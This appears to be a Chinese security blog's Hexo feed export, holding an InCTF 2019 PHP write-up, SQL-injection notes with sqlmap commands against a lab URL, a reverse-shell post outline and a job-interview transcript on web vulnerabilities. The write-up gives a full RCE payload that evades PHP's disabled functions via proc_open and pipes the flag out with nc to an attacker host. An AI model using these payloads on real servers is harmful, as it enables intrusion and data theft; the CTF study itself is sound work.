class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$thisfille</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;thisfile&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t use inner file&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="variable">$thisfille</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Naaah&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File doesn&#x27;t exist&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span>(<span class="params"><span class="variable">$ass</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ass</span> <span class="keyword">as</span> <span class="variable">$hole</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AssHole&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP+2.5与上面两道相比，它的限制条件更加苛刻，要求参数input的长度小于100字符</p>
+<h2 id="构造Payload一穿三"><a href="#构造Payload一穿三" class="headerlink" title="构造Payload一穿三"></a>构造Payload一穿三</h2><p>第一步是想办法执行<code>phpinfo()</code>，然后在phpinfo中查找<code>disable_functions</code>。想办法找到可以利用的函数去getshell。仔细查找之后，发现<code>.</code>与<code>$</code>不在<code>$blacklist</code>里面。这两个字符将会有助于我们绕过<code>preg_match</code>的过滤。<br>我们可以利用PHP字符串拼接的方式去构造出phpinfo，payload如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=p.h.p.i.n.f.o;<span class="variable">$a</span>();</span><br></pre></td></tr></table></figure>
+<p>虽然这种拼接方式，php可能会报一些警告，但是并不会报错。是能够正常执行的。</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/4.png" class="">
+
+<p>我们利用拼接好的payload去尝试读取phpinfo。成功读到phpinfo。<code>disable_functions</code>如下</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">pcntl<span class="built_in">_</span>alarm,pcntl<span class="built_in">_</span>fork,pcntl<span class="built_in">_</span>waitpid,pcntl<span class="built_in">_</span>wait,pcntl<span class="built_in">_</span>wifexited,pcntl<span class="built_in">_</span>wifstopped,pcntl<span class="built_in">_</span>wifsignaled,pcntl<span class="built_in">_</span>wifcontinued,pcntl<span class="built_in">_</span>wexitstatus,pcntl<span class="built_in">_</span>wtermsig,pcntl<span class="built_in">_</span>wstopsig,pcntl<span class="built_in">_</span>signal,pcntl<span class="built_in">_</span>signal<span class="built_in">_</span>get<span class="built_in">_</span>handler,pcntl<span class="built_in">_</span>signal<span class="built_in">_</span>dispatch,pcntl<span class="built_in">_</span>get<span class="built_in">_</span>last<span class="built_in">_</span>error,pcntl<span class="built_in">_</span>strerror,pcntl<span class="built_in">_</span>sigprocmask,pcntl<span class="built_in">_</span>sigwaitinfo,pcntl<span class="built_in">_</span>sigtimedwait,pcntl<span class="built_in">_</span>exec,pcntl<span class="built_in">_</span>getpriority,pcntl<span class="built_in">_</span>setpriority,pcntl<span class="built_in">_</span>async<span class="built_in">_</span>signals,exec,system,shell<span class="built_in">_</span>exec,popen,passthru,link,symlink,syslog,imap<span class="built_in">_</span>open,ld,error<span class="built_in">_</span>log,mail,file<span class="built_in">_</span>put<span class="built_in">_</span>contents,scandir,file<span class="built_in">_</span>get<span class="built_in">_</span>contents,readfile,fread,fopen,chdir	</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/5.png" class="">
+
+<p>仔细观察，发现<code>proc_open</code>函数并没有被ban掉。这也是一穿三的关键所在。查看<code>proc_open</code>的函数手册，我们发现这个函数需要传入三个参数：<strong>我们想要执行的命令和两个数组</strong>。第一个数组是一个文件描述符的数组。就像下面一样</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;r&#x27;</span>),</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;w&#x27;</span>),</span><br><span class="line">	<span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span> =&gt; <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>而在利用它来直接构造payload的时候发现，如果直接将其加入payload，会造成payload超出限制长度的问题。这时候可以巧妙的利用$_GET请求来发送数组。本地测试如下</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">payload = &quot; arr[0][]=pipe<span class="built_in">&amp;</span>arr[0][]=r<span class="built_in">&amp;</span>arr[1][]=pipe<span class="built_in">&amp;</span>arr[1][]=w<span class="built_in">&amp;</span>arr[2][]=pipe<span class="built_in">&amp;</span>arr[2][]=w &quot;</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/6.png" class="">
+
+
+<p>为了调用<code>proc_open</code>，我们可以再次使用PHP字符串拼接的方式。但是这时候遇到一个问题，我们发现下划线居然被过滤了，简直丧心病狂。最后可以拼接出一个<code>chr</code>函数。利用ascii编码来绕过下划线过滤</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/7.png" class="">
+
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>b=ch.r;<span class="built_in">$</span>u=<span class="built_in">$</span>b(95);</span><br></pre></td></tr></table></figure>
+<p>然后将构造好的下划线拼到<code>proc_open</code>中</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>e=pr.oc.<span class="built_in">$</span>u.op.en;</span><br></pre></td></tr></table></figure>
+<p>接下来我们需要想办法构造一个GET传参，以获取传入的描述数组。可以利用PHP的可变变量去构造，先构造一个<code>_GET</code>，然后再<code>$$_GET</code>，即可。</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="built_in">$</span>k=<span class="built_in">$</span>u.G.E.T;<span class="built_in">$</span>g=<span class="built_in">$</span><span class="built_in">$</span>k;</span><br></pre></td></tr></table></figure>
+
+<p>现在，一切都准备好了。再来回顾一下，<code>proc_open</code>需要三个参数<code>(要执行的命令, 一个索引数组, 命令的初始工作目录)</code><br>我们可以使用<code>current</code>和<code>next</code>这两个函数去构造payload。但是这时需要注意的一个问题是。URL上的第一个变量一定要是我们要执行的命令，第二个变量是描述数组</p>
+<img src="/2021/08/26/InCTF-2019-%EF%BC%88PHP-1-PHP-1-5-and-PHP-2-5%EF%BC%89%E4%B8%89%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/8.png" class="">
+<p>我们可以利用以上条件，将payload构造成大概长这个样子</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">http://challenge-address/?p=command<span class="built_in">&amp;</span>arr[][]=descriptor-array<span class="built_in">&amp;</span>input=payload<span class="built_in">&amp;</span>thisfile=/var/</span><br></pre></td></tr></table></figure>
+<p>但是有个问题，我们不知道应该怎么去查询flag文件的位置。这时可以使用<code>glob</code>函数去寻找文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo im&#x27;</span>.<span class="string">&#x27;plode(&quot;a&quot;,gl&#x27;</span>.<span class="string">&#x27;ob(&quot;*&quot;));&#x27;</span>);&amp;thisfile=/<span class="keyword">var</span>/</span><br><span class="line"><span class="comment">// 这里有个取巧的地方是，我们只在第一道题查询了flag文件的位置（只有第一道题能够使用eval）。然后在后面两道题目中我们猜测flag的位置是固定不变的。事实证明，果然如此。</span></span><br></pre></td></tr></table></figure>
+<p>我们准备读取<code>/flag</code>文件，但是发现权限不够。这时候发现同目录下面还有一个<code>/readFlag</code>的可执行文件。利用这个可执行文件，顺利拿到flag。</p>
+<p>关键部分payload构造如下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>=ch.r;</span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$b</span>(<span class="number">95</span>);</span><br><span class="line"><span class="variable">$k</span>=<span class="variable">$u</span>.G.E.T;</span><br><span class="line"><span class="variable">$c</span>=cur.rent;</span><br><span class="line"><span class="variable">$n</span>=ne.xt;</span><br><span class="line"><span class="variable">$g</span>=<span class="variable">$$k</span>;</span><br><span class="line"><span class="variable">$e</span>=pr.oc.<span class="variable">$u</span>.op.en;</span><br><span class="line"><span class="variable">$e</span>(<span class="variable">$c</span>(<span class="variable">$g</span>),<span class="variable">$n</span>(<span class="variable">$g</span>),<span class="variable">$j</span>);</span><br><span class="line"><span class="comment">// proc_open(current($$_GET),next($$_GET),$j);</span></span><br></pre></td></tr></table></figure>
+
+<p>完整payload如下（input最终长度为97个字符）<br><code>http://xxx.xxx.xx/?p=/readFlag /flag | nc your-ip port&amp;arr[0][]=pipe&amp;arr[0][]=r&amp;arr[1][]=pipe&amp;arr[1][]=w&amp;arr[2][]=pipe&amp;arr[2][]=w&amp;input=$b=ch.r;$u=$b(95);$k=$u.G.E.T;$c=cur.rent;$n=ne.xt;$g=$$k;$e=pr.oc.$u.op.en;$e($c($g),$n($g),$j);$thisfile=/var/</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux下常见的几种反弹shell</title>
+    <url>/2021/08/31/Linux%E4%B8%8B%E5%B8%B8%E8%A7%81%E7%9A%84%E5%87%A0%E7%A7%8D%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a>反弹shell的本质是什么</h2><h2 id="常见的反弹shell的语句"><a href="#常见的反弹shell的语句" class="headerlink" title="常见的反弹shell的语句"></a>常见的反弹shell的语句</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>]]></content>
+      <categories>
+        <category>SHELL</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>反弹shell</tag>
+        <tag>原理分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入</title>
+    <url>/2021/08/21/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<ul>
+<li>什么是SQL注入</li>
+<li>如何寻找SQL注入漏洞</li>
+<li>如何利用SQL注入漏洞</li>
+<li>如何防御SQL注入漏洞</li>
+</ul>
+<img src="/2021/08/21/SQL%E6%B3%A8%E5%85%A5/sql-injection.png" class="" title="SQL注入概要">
+
+<h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>SQL注入是一种Web安全漏洞，允许攻击者干扰Web程序对数据库的查询操作。SQL注入能让攻击者查看正常情况下无法查看的数据。包括其他用户的数据，或者Web程序下的任何数据。在许多情况下，攻击者可以修改或删除这些数据，从而导致Web程序的内容或者功能发生永久性的改变。</p>
+<p>而在某些情况下，攻击者可以深入利用SQL注入来获取shell，或者执行拒绝服务攻击</p>
+<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交 或 输入域名 或 页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令</p>
+<h2 id="SQL注入示例"><a href="#SQL注入示例" class="headerlink" title="SQL注入示例"></a>SQL注入示例</h2><ol>
+<li>验证是否存在SQL注入<br>input admin 123456</li>
+</ol>
+<p>your uname:admin and your pwd:123456</p>
+<p>input admin’ 123456</p>
+<p>no data!</p>
+<p>input admin’ or 1=1#  123456<br>  假             真<br>your uname:admin and your pwd:123456</p>
+<p>if  真:<br>    return “your uname:admin and your pwd:123456”<br>else:<br>    no data!</p>
+<ol start="2">
+<li>需要</li>
+</ol>
+<p>盲注的payload</p>
+<p>request库怎么用</p>
+<ol start="3">
+<li>工具的使用<br>sqlmap  python脚本</li>
+</ol>
+<p>sqlmap -h     /(help)</p>
+<p>sqlmap -u <a href="https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=">https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=</a> -p “category” –level 3           /(url)  /(level 0-5)</p>
+<p>sqlmap -u <a href="https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=">https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=</a> -p “category” –dbs –level 3      /(database) </p>
+<p>sqlmap -u <a href="https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=">https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=</a> -p “category” -D flag –tables –level 3    /(tables)</p>
+<p>sqlmap -u <a href="https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=">https://acbd1fe51f3a68d7c0f4287600040074.web-security-academy.net/filter?category=</a> -p “category” -D flag -T fllag –dump –level 3    /(tables)</p>
+<p>sqlmap -r sql.txt –dbs </p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>基础漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XSS</title>
+    <url>/2021/09/03/XSS/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>基础漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/11/02/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程部署"><a href="#远程部署" class="headerlink" title="远程部署"></a>远程部署</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+]]></content>
+  </entry>
+  <entry>
+    <title>keep面试总结</title>
+    <url>/2021/10/16/keep%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="1-您先简单的做一下自我介绍好了"><a href="#1-您先简单的做一下自我介绍好了" class="headerlink" title="1. 您先简单的做一下自我介绍好了"></a>1. 您先简单的做一下自我介绍好了</h2><p>我: 我是来自成都信息工程大学的信息安全专业, 曾经打过一些CTF比赛, 做过一些简单的漏洞挖掘.<br>面试官: 你可以介绍一下你的一些在校的一些比赛参加过的一些比赛还有一些擅长的挖掘漏洞吗<br>我: 我在学校CTF比赛主要负责web方向, 主要的研究方向也是web层面的漏洞, 然后在edu-src上面提交过一个存储型的xss还有一个逻辑漏洞, 获得过一些奖项的话就是一些公司的比赛, 还有一个国家级的CTF比赛. </p>
+<h2 id="2-大概介绍一下xss都有哪些类型-原理-还有它的一些防御方式"><a href="#2-大概介绍一下xss都有哪些类型-原理-还有它的一些防御方式" class="headerlink" title="2. 大概介绍一下xss都有哪些类型, 原理, 还有它的一些防御方式"></a>2. 大概介绍一下xss都有哪些类型, 原理, 还有它的一些防御方式</h2><p>我: XSS主要有三种, 一种是存储型的XSS, 一种是反射型的, 还有一种是DOM型的, 反射型的XSS主要出现在url上面, 以及一些搜索框之类的地方, 他的触发之后会直接把打入的JavaScript触发出来, 通常来说危害比较小, 而存储型的XSS通常在留言框之类的地方或者, 要输入信息存储入数据库的一些地方, 他的触发是当有人浏览到你的信息之后, 然后这个存储型xss就会触发从而获取到一些别人的信息, 你可以通过存储型XSS来获取别人的cookie, 而DOM型XSS主要出现在跟反射型有点类似, 但他主要出现在页面的DOM树的地方, 主要插入在页面里面</p>
+<p>面试官: 那针对漏洞的一些修复, 一些防御呢, 一般是怎么做的<br>我: 如果业务功能不是很特殊的话, 通常来说是直接用html实体化转义进行字符编码, 把用户的输入全部给实体化转义, 如果需要用户使用到html编码的地方, 那么我们可以设计白名单的思路, 限制用户只输入需要用到的html标签, 针对业务场景的不同设计的白名单也可以不同, 然后同时还可以限制用户的输入长度在一定字符之内, 这样用户也没法进行一个XSS的利用. 主要就是这些</p>
+<h2 id="3-介绍一下你攻克的CTF里面比较难的一道题目"><a href="#3-介绍一下你攻克的CTF里面比较难的一道题目" class="headerlink" title="3. 介绍一下你攻克的CTF里面比较难的一道题目"></a>3. 介绍一下你攻克的CTF里面比较难的一道题目</h2><p>我: 我做过的一道比较难的题目是, 之前打一个国外的CTF比赛, 然后他的题目的考点是PHP的RCE, 他把PHP里面能够RCE的函数基本过滤的差不多了, 只留了一个 <code>proc_open()</code> , 同时还把一些特殊字符给过滤掉了, 要在这种严格的情况下去RCE, 当时是利用了字符串编码函数, 用 <code>chr()</code> 函数以及php的拼接特性, 用点号拼接出chr函数之后进行编码, 然后用这个编码去编码出特殊字符, 比如像下划线这种, 再用点号去拼接了 <code>proc_open()</code> 函数, 并用chr函数代替, 然后再构造了几个GET请求来传入参数, 进行一个拼接的操作, 然后实现了RCE. 当时去做这个题查了很多资料, 然后FUZZ了敏感字符. </p>
+<h2 id="4-列举5个高危的端口-以及可能会存在的问题"><a href="#4-列举5个高危的端口-以及可能会存在的问题" class="headerlink" title="4. 列举5个高危的端口, 以及可能会存在的问题"></a>4. 列举5个高危的端口, 以及可能会存在的问题</h2><p>我: 最出名的就是3389嘛, 永恒之蓝. 可以导致用户用永恒之蓝漏洞去攻击这个windows系统. 然后还有6379的redis未授权. 还有3306 mysql的弱口令. 22端口ssh弱口令.</p>
+<p>面试官: 我问一下MogoDB的默认端口是多少你知道吗<br>我: 不太清楚, 是1443吗?<br>面试官: 不是, 是27017. 你平时用的比较多的数据库是什么呀<br>我: Mysql多一点</p>
+<p>面试官: ES有用过吗<br>我: 没有用过</p>
+<h2 id="5-redis未授权访问的漏洞如何入侵利用-以及你有了未授权访问你会做什么事"><a href="#5-redis未授权访问的漏洞如何入侵利用-以及你有了未授权访问你会做什么事" class="headerlink" title="5. redis未授权访问的漏洞如何入侵利用, 以及你有了未授权访问你会做什么事"></a>5. redis未授权访问的漏洞如何入侵利用, 以及你有了未授权访问你会做什么事</h2><p>我: 我用的比较多的方案是, 直接往里面写入 <code>ssh_key</code> 文件, 进行一个ssh的远程连接</p>
+<p>面试官: 写入sshkey的前提是什么<br>我: 首先那边要有权限, 然后他没有设置redis数据库的密码. 这样就可以一个默认的身份去写入redis文件</p>
+<p>面试官: 你这个默认的身份指的是什么身份<br>我: 我觉得是redis的用户的身份, 类似admin</p>
+<p>面试官: 你实操过吗<br>我: 实操过一次, 就是遇到可以直接写ssh_key的一个内网环境. 写进去之后就可以直接连上了当时</p>
+<h2 id="6-大概介绍一下-CSRF-和-SSRF-这两个漏洞-他们的原理大概是什么"><a href="#6-大概介绍一下-CSRF-和-SSRF-这两个漏洞-他们的原理大概是什么" class="headerlink" title="6. 大概介绍一下 CSRF 和 SSRF 这两个漏洞, 他们的原理大概是什么"></a>6. 大概介绍一下 CSRF 和 SSRF 这两个漏洞, 他们的原理大概是什么</h2><p>我: CSRF的话是跨站点的一个请求伪造, 它的作用就是, 比如我给你一个存在CSRF的漏洞的链接一个点. 然后你触发这个CSRF之后会通过你的身份去执行一些操作, 这个是CSRF漏洞. 而SSRF漏洞的话是指, 服务器端的一个请求伪造, 可以通过这个SSRF漏洞去伪造成一个服务器的请求吧, 去对内网的一些资源进行一些处理</p>
+<p>面试官: 那CSRF漏洞应该怎么去防御呢<br>我: CSRF漏洞的防御的话, 通常了说最简单的方式就是加一个Token的验证, 在遇到要CSRF的地方的时候, 你用户token匹配不上那么这个操作就不会执行, 那么这个csrf漏洞就对你无效了, 最好是在功能点地方, 比如说像用户登录这些操作的地方加入一个验证的验证, 这样的话就算遇到CSRF漏洞的话也是可以及时反应过来的. 最主要就是这两种</p>
+<h2 id="7-给你一个网站-你怎样开展这个渗透测试-你都会做哪些事"><a href="#7-给你一个网站-你怎样开展这个渗透测试-你都会做哪些事" class="headerlink" title="7. 给你一个网站, 你怎样开展这个渗透测试, 你都会做哪些事"></a>7. 给你一个网站, 你怎样开展这个渗透测试, 你都会做哪些事</h2><p>我: 首先是做一个全面的信息收集, 从他的企业信息, github仓库有无源码泄露, 以及历史的发布, 再到他的子域名, 他的副产业的一些收集, 把他的资产收集全之后. 对他做一个端口的扫描, 看他开放了哪些端口, 以及他所在的ip段有没有发布的产品但是ip暴露在公网上的一些ip, 对他的ip段进行一个扫描收集, 收集完之后, 根据他暴露的端口信息, 看有没有敏感的端口, 然后去对他开放的服务去做一些, 比如说有历史漏洞的一些服务, 拿exp去打一下. 然后这些敏感端口测完之后再去测他的功能点, 去测他的web服务. 通常从他的web服务先开一个扫描器, 对站点的目录框架有一个整体了解, 再去测他的敏感功能点, 比如登录注册这种敏感操作. 或者说如果有购物情况的话, 从物品购物的界面去测有无逻辑漏洞, 有没有越权. 登陆界面的话主要测用户的, 主要还是逻辑漏洞, 然后用户密码的sql注入之类的, 然后同时在设计网站架构的时候, 扫描网站目录的时候, 有时候会遇到源代码泄漏的情况, 比如开发人员他的备份代码忘记删除这种情况, 拿到源代码之后可以进一步做代码审计, 去审计一些复杂情况的漏洞, 然后在做完这些漏洞挖掘的情况下把产出结果写成文章进行上报, 完成一个收尾的情况, 大概就是这样</p>
+<h2 id="8-登录注册一般会有哪些问题"><a href="#8-登录注册一般会有哪些问题" class="headerlink" title="8. 登录注册一般会有哪些问题"></a>8. 登录注册一般会有哪些问题</h2><p>我: 登录注册这一块儿最明显的安全问题就是sql注入, 也是最大的安全问题吧, 还有安全问题就是, 密码爆破, 如果验证码没有做好的话, 可能会导致登录界面强行爆破密码. 修改密码这里通常来说会有发送验证码的功能, 如果发送验证码这个功能请求比如你要给一个手机号发送验证码, 但是你发送验证码的这个手机号是明文传输在数据包里面的, 那么你这个手机号可能被拦截下来然后更改为攻击者的手机号, 那么你的手机号就会发送到攻击者的手机上, 然后攻击者利用这个逻辑漏洞去更改任意用户的密码, 这也是一个比较严重的地方. </p>
+<p>面试官: 那登录验证码有什么要求呢<br>我: 首先这个验证码不能被机器识别, 因为现在很多python的库可以进行验证码的识别. 还有就是验证码要及时的刷新, 用户每发一次包验证码就得刷新一次, 就为了避免别人用同一个验证码去发包. 验证码大概做到这两点就安全了</p>
+<h2 id="9-有哪些应用或者组件是比较高危的-以及他那些组件一般会有哪些安全问题"><a href="#9-有哪些应用或者组件是比较高危的-以及他那些组件一般会有哪些安全问题" class="headerlink" title="9. 有哪些应用或者组件是比较高危的, 以及他那些组件一般会有哪些安全问题"></a>9. 有哪些应用或者组件是比较高危的, 以及他那些组件一般会有哪些安全问题</h2><p>我: 我了解过得, 但是我没有去深入理解过原理, 我搜集到过的一些漏洞就是. thinkphp的rce, thinkphp5, thinkphp3的sql注入. 以及最近比较火的 Solr java的组件的RCE漏洞, 还有比较常见的像是, java各种组件的反序列化漏洞. 大概就是这些吧</p>
+<h2 id="10-反序列化漏洞的原理你了解吗"><a href="#10-反序列化漏洞的原理你了解吗" class="headerlink" title="10. 反序列化漏洞的原理你了解吗"></a>10. 反序列化漏洞的原理你了解吗</h2><p>我: 不是特别了解</p>
+<p>面试官: 那你大概说一下你了解到的反序列化大概是怎么一回事<br>我: 我了解到的反序列化他就是, 以PHP为例, 通常来说序列化操作, 他涉及到几个序列化的函数, 比如像 <code>__wake()</code> 之类的序列化操作, 当他这个序列化操作是用户可控的时候, 用户通过这几个可控的序列化函数去控制他的序列化的一个过程, 然后去恶意构造出一个序列化的结果, 去把这个构造出的payload打回去, 然后程序本身对你这个payload进行一个序列化操作之后, 就会触发你在这里面打入的一些恶意的参数也就是payload, 这是我理解到的一个部分</p>
+<p>面试官: 那对于这个反序列化漏洞的修复和防御要怎么做呢<br>我: 去根据开发手册去执行序列化的开发过程, 就避免任何不安全的序列化的引用, 尽量不要使用危险的序列化函数, 大概就是这些</p>
+<h2 id="11-大概介绍一下DDos攻击的原理以及DDos攻击的分类有哪些"><a href="#11-大概介绍一下DDos攻击的原理以及DDos攻击的分类有哪些" class="headerlink" title="11. 大概介绍一下DDos攻击的原理以及DDos攻击的分类有哪些"></a>11. 大概介绍一下DDos攻击的原理以及DDos攻击的分类有哪些</h2><p>我: DDos攻击主要有两种, 一种是传统的DDos攻击, 利用很多的恶意IP不断的去访问你这个服务, 给这个服务带来巨大量的请求, 去消耗服务器资源, 使你这个服务宕机, 这是传统的DDos攻击. 而后来安全人员把这些恶意IP进行筛查之后有一种新型的攻击手段就是, 利用你自身的一个安全的应用利用自身的一个请求去大量的访问, 就是你允许的一个安全的操作, 把这个操作大量的执行然后达到一个消耗服务器内存的目的, 然后让服务器宕机的一个操作</p>
+<h2 id="12-你有没有做过一些API相关的渗透测试项目"><a href="#12-你有没有做过一些API相关的渗透测试项目" class="headerlink" title="12. 你有没有做过一些API相关的渗透测试项目"></a>12. 你有没有做过一些API相关的渗透测试项目</h2><p>我: 没有, API相关的没有接触过</p>
+<p>面试官: 那假如说有一个场景, 就是有一个API接口或者说任何一个接口或者URL, 存在一个重放攻击的一个安全问题, 如果让你去设计一个方案怎么去防御这个重放攻击<br>我: 我来设计的话, 首先是做一个用户输入的检测. 首先做一个非法字符的检测, 然后去看他这个请求, 他如果做重放攻击, 他肯定要发送很多次请求, 去看有没有一个IP地址有没有恶意的多次访问, 如果检测到一个IP地址频繁访问的话就把他的IP地址纳入黑名单, 去把他的IP给ban掉. </p>
